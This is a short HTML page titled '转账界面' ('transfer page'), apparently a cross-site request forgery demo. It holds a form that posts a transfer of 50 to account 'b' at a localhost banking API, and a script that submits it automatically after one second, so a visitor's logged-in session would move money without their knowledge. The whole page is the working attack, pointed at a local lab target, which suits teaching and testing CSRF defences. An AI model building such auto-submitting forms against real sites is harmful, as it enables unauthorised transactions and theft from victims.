<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>转账界面</title>
</head>

<body>
  <form id="transferform" method="post" action="http://localhost:8080/api/transfer">
    <input type="text" name="target" value="b" />
    <input type="text" name="amount" value="50" />
    <input type="submit">
  </form>

  <script>
    setTimeout(() => {
      document.getElementById('transferform').submit()
    }, 1000)
  </script>
</body>

</html>
